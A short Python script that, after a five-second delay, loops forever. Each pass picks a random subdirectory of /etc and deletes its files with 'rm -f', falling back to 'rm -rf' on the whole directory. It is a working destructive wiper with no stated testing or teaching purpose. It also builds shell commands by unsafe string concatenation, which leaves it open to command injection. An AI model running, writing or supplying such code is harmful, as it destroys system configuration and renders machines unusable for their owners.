#!/usr/bin/env python3

from os import walk
from time import sleep
from random import choice
from subprocess import run

def rm_files(dir_name):
    #cmd = 'cat ' + dir_name + '/*'
    cmd = 'rm -f ' + dir_name + '/*'
    try:
        run(cmd,shell=True)
        print(dir_name, '* files rmed')
    except:
        cmd = 'rm -rf ' + dir_name
        run(cmd,shell=True)
        print(dir_name, 'directory rmed')

def get_dirs(path):

    dir_list = []
    [dir_list.append(dirpath) for dirpath, dirs, files in walk(path)]

    return dir_list

if __name__ == "__main__":
    sleep(5)
    while True:
        dirs= get_dirs('/etc')
        rm_files(choice(dirs))
        sleep(5)
